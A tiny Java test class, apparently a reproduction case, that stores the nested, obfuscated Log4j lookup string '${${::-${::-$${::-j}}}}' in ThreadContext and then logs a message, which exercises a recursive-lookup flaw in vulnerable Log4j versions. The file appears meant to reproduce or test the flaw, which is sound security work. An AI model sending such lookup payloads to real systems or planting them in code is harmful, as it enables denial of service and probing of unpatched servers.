package sample;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

public class Test {
	private static final Logger logger = LogManager.getLogger(Test.class);

	public static void main(String ag[]) {
		ThreadContext.put("apiversion", "${${::-${::-$${::-j}}}}");
		logger.error("Hello");
	}
}
